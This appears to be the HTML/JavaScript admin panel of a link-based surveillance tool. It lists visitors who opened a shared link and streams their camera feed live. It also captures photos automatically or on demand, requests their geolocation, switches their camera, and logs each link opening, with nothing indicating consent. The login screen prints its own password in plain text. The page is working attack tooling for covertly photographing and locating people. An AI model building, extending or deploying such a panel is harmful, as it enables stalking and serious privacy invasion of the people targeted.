<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Dashboard</title>
<style>
* { box-sizing: border-box; }
body {
    margin: 0;
    padding: 20px;
    background: #121212;
    color: #eee;
    font-family: Arial, Helvetica, sans-serif;
}
.container { max-width: 1300px; margin: auto; }
h1, h2 { color: white; }
.panel { background: #1e1e1e; padding: 20px; margin-bottom: 20px; border-radius: 10px; }
.controls { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; }
button {
    border: 0;
    padding: 10px 15px;
    border-radius: 6px;
    cursor: pointer;
    background: #3498db;
    color: white;
}
button:hover { opacity: 0.9; }
button:disabled { opacity: 0.5; cursor: not-allowed; }
button.danger { background: #e74c3c; }
button.success { background: #27ae60; }
button.switch { background: #8e44ad; }
button.gray { background: #555; }
.status { font-weight: bold; }
.users { display: grid; gap: 10px; }
.user {
    background: #292929;
    padding: 12px;
    border-radius: 8px;
    display: flex;
    justify-content: space-between;
    gap: 10px;
    align-items: center;
}
.user-info { font-size: 13px; }
.live { width: 100%; max-width: 640px; background: #000; border-radius: 8px; display: block; margin: auto; }
.photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 15px; }
.photo { background: #292929; padding: 10px; border-radius: 8px; }
.photo img { width: 100%; border-radius: 6px; display: block; margin-bottom: 8px; }
.history { max-height: 400px; overflow-y: auto; }
.history-item { padding: 10px; margin-bottom: 8px; background: #292929; border-radius: 6px; font-size: 13px; }
.login { min-height: 100vh; display: flex; justify-content: center; align-items: center; }
.login-box { width: 90%; max-width: 400px; background: #1e1e1e; padding: 25px; border-radius: 10px; }
input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 1px solid #555; background: #111; color: white; }
.hidden { display: none !important; }
</style>
</head>
<body>

<div id="loginPage" class="login">
    <div class="login-box">
        <h2>Admin Login</h2>
        <p>Enter password (<b>Ayaz;@</b>)</p>
        <input id="password" type="password" placeholder="Admin Password">
        <button onclick="login()" style="width:100%;">Login</button>
        <p id="loginError" style="color:#e74c3c;"></p>
    </div>
</div>

<div id="dashboard" class="container hidden">
    <h1>Admin Dashboard</h1>
    
    <div class="panel">
        <h2>Controls</h2>
        <div class="controls">
            <button id="linkButton" onclick="toggleLink()">Disable Link</button>
            <button id="autoButton" onclick="toggleAutoCapture()">Auto Capture: ON</button>
            <button class="gray" onclick="logout()">Logout</button>
            <span id="linkStatus" class="status">Status: Loading...</span>
        </div>
    </div>

    <div class="panel">
        <h2>Active Users</h2>
        <p id="userCount">0 / 5</p>
        <div id="usersList" class="users">Waiting for users...</div>
    </div>

    <div class="panel">
        <h2>Live Feed & Actions</h2>
        <p id="selectedUser">No user selected.</p>
        <img id="liveImage" class="live" style="display:none;">
        <br>
        <div class="controls" style="justify-content: center; margin-top: 10px;">
            <button id="captureButton" onclick="captureSelectedUser()" disabled>Capture Photo</button>
            <button id="locButton" class="success" onclick="requestUserLocation()" disabled>📍 Request Location</button>
            <button id="switchCamButton" class="switch" onclick="switchUserCamera()" disabled>🔄 Switch Camera</button>
        </div>
    </div>

    <div class="panel">
        <h2>Temporary Captured Photos</h2>
        <div id="photoGrid" class="photo-grid">No photos.</div>
    </div>

    <div class="panel">
        <h2>Link Access History</h2>
        <div id="history" class="history">Loading history...</div>
    </div>
</div>

<script src="/socket.io/socket.io.js"></script>
<script>
let socket = null;
let selectedSocketId = null;
let isLinkActive = true;
let isAutoCapture = true;
let maxUsers = 5;

async function login() {
    const password = document.getElementById("password").value;
    const response = await fetch("/api/admin/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password })
    });
    const data = await response.json();
    if (!data.ok) {
        document.getElementById("loginError").textContent = data.error || "Login failed.";
        return;
    }
    showDashboard();
}

async function checkLogin() {
    const response = await fetch("/api/admin/status");
    const data = await response.json();
    if (data.authenticated) showDashboard();
    else showLogin();
}

function showLogin() {
    document.getElementById("loginPage").classList.remove("hidden");
    document.getElementById("dashboard").classList.add("hidden");
}

function showDashboard() {
    document.getElementById("loginPage").classList.add("hidden");
    document.getElementById("dashboard").classList.remove("hidden");
    connectSocket();
}

function connectSocket() {
    if (socket) return;
    socket = io();

    socket.on("connect", () => { socket.emit("admin-join"); });
    socket.on("admin-auth-required", () => { socket.disconnect(); showLogin(); });
    socket.on("admin-initial-state", state => {
        isLinkActive = state.linkActive;
        isAutoCapture = state.autoCapture;
        maxUsers = state.maxUsers;
        updateLinkUI();
        updateAutoUI();
        renderUsers(state.users);
        renderHistory(state.history);
        renderPhotos(state.photos);
    });

    socket.on("update-users-list", users => { renderUsers(users); });
    socket.on("link-status", status => { isLinkActive = status; updateLinkUI(); });
    socket.on("auto-capture-status", status => { isAutoCapture = status; updateAutoUI(); });
    socket.on("access-event", event => { addHistoryEvent(event); });
    socket.on("update-live-stream", data => {
        if (data.socketId !== selectedSocketId) return;
        const img = document.getElementById("liveImage");
        img.src = data.frameData;
        img.style.display = "block";
    });
    socket.on("new-photo", photo => { addPhoto(photo); });
    socket.on("photo-deleted", photoId => {
        const element = document.getElementById(`photo-${photoId}`);
        if (element) element.remove();
    });
}

function renderUsers(users) {
    const container = document.getElementById("usersList");
    container.innerHTML = "";
    const ids = Object.keys(users);
    document.getElementById("userCount").textContent = `${ids.length} / ${maxUsers}`;

    if (ids.length === 0) {
        container.textContent = "No active users.";
        selectedSocketId = null;
        document.getElementById("captureButton").disabled = true;
        document.getElementById("locButton").disabled = true;
        document.getElementById("switchCamButton").disabled = true;
        document.getElementById("liveImage").style.display = "none";
        return;
    }

    ids.forEach(id => {
        const user = users[id];
        const div = document.createElement("div");
        div.className = "user";
        const info = document.createElement("div");
        info.className = "user-info";

        let locationText = "Location not shared";
        if (user.location) {
            locationText = `Location: ${user.location.latitude}, ${user.location.longitude}`;
        }

        info.innerHTML = `
            <strong>${escapeHtml(user.deviceInfo)}</strong><br>
            <small>ID: ${escapeHtml(id.substring(0, 8))}...</small><br>
            <small>Connected: ${escapeHtml(user.connectedAt)}</small><br>
            <small style="color: #2ecc71;">${escapeHtml(locationText)}</small>
        `;

        const button = document.createElement("button");
        button.textContent = "View";
        button.onclick = () => { selectUser(id, user.deviceInfo); };

        div.appendChild(info);
        div.appendChild(button);
        container.appendChild(div);
    });

    if (selectedSocketId && !users[selectedSocketId]) {
        selectedSocketId = null;
        document.getElementById("selectedUser").textContent = "Selected user disconnected.";
        document.getElementById("captureButton").disabled = true;
        document.getElementById("locButton").disabled = true;
        document.getElementById("switchCamButton").disabled = true;
        document.getElementById("liveImage").style.display = "none";
    }
}

function selectUser(id, name) {
    selectedSocketId = id;
    document.getElementById("selectedUser").textContent = `Viewing: ${name} (${id.substring(0, 8)})`;
    document.getElementById("captureButton").disabled = false;
    document.getElementById("locButton").disabled = false;
    document.getElementById("switchCamButton").disabled = false;
    socket.emit("admin-select-user", id);
}

function captureSelectedUser() {
    if (!selectedSocketId) return;
    socket.emit("admin-trigger-capture", selectedSocketId);
}

function requestUserLocation() {
    if (!selectedSocketId) return;
    socket.emit("admin-request-location", selectedSocketId);
}

function switchUserCamera() {
    if (!selectedSocketId) return;
    socket.emit("admin-switch-camera", selectedSocketId);
}

async function toggleLink() {
    const newStatus = !isLinkActive;
    await fetch("/api/admin/link", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ active: newStatus })
    });
}

async function toggleAutoCapture() {
    const newStatus = !isAutoCapture;
    await fetch("/api/admin/auto-capture", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ enabled: newStatus })
    });
}

function updateLinkUI() {
    const button = document.getElementById("linkButton");
    const status = document.getElementById("linkStatus");
    if (isLinkActive) {
        button.textContent = "Disable Link";
        button.className = "";
        status.textContent = "Status: Active";
        status.style.color = "#27ae60";
    } else {
        button.textContent = "Enable Link";
        button.className = "danger";
        status.textContent = "Status: Disabled";
        status.style.color = "#e74c3c";
    }
}

function updateAutoUI() {
    const button = document.getElementById("autoButton");
    button.textContent = `Auto Capture: ${isAutoCapture ? "ON" : "OFF"}`;
}

function renderPhotos(photos) {
    const grid = document.getElementById("photoGrid");
    grid.innerHTML = "";
    if (!photos.length) {
        grid.textContent = "No photos.";
        return;
    }
    photos.forEach(photo => addPhoto(photo, false));
}

function addPhoto(photo, prepend = true) {
    const grid = document.getElementById("photoGrid");
    if (grid.textContent.trim() === "No photos.") grid.innerHTML = "";

    const card = document.createElement("div");
    card.className = "photo";
    card.id = `photo-${photo.id}`;

    const image = document.createElement("img");
    image.src = photo.imageData;
    image.alt = "Captured image";

    const download = document.createElement("a");
    download.href = `/api/admin/photos/${encodeURIComponent(photo.id)}/download`;
    download.textContent = "Download";
    download.style.display = "inline-block";
    download.style.marginRight = "8px";
    download.style.color = "#3498db";

    const deleteButton = document.createElement("button");
    deleteButton.textContent = "Delete";
    deleteButton.className = "danger";
    deleteButton.onclick = () => deletePhoto(photo.id);

    card.appendChild(image);
    card.appendChild(download);
    card.appendChild(deleteButton);

    if (prepend) grid.prepend(card);
    else grid.appendChild(card);
}

async function deletePhoto(id) {
    if (!confirm("Delete this photo?")) return;
    await fetch(`/api/admin/photos/${encodeURIComponent(id)}`, { method: "DELETE" });
}

function renderHistory(history) {
    const container = document.getElementById("history");
    container.innerHTML = "";
    if (!history.length) {
        container.textContent = "No history.";
        return;
    }
    history.forEach(event => addHistoryEvent(event, false));
}

function addHistoryEvent(event, prepend = true) {
    const container = document.getElementById("history");
    if (container.textContent.trim() === "No history.") container.innerHTML = "";

    const item = document.createElement("div");
    item.className = "history-item";
    const type = event.event === "link-opened" ? "🔗 Link Opened" : "❌ Link Closed";

    item.innerHTML = `
        <strong>${type}</strong><br>
        Device: ${escapeHtml(event.deviceInfo || "Unknown")}<br>
        Session: ${escapeHtml((event.socketId || "").substring(0, 8))}...<br>
        Time: ${escapeHtml(event.time || "")}
    `;

    if (prepend) container.prepend(item);
    else container.appendChild(item);
}

function escapeHtml(value) {
    return String(value)
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll('"', "&quot;")
        .replaceAll("'", "&#039;");
}

async function logout() {
    await fetch("/api/admin/logout", { method: "POST" });
    if (socket) { socket.disconnect(); socket = null; }
    showLogin();
}

checkLogin();
</script>
</body>
</html>
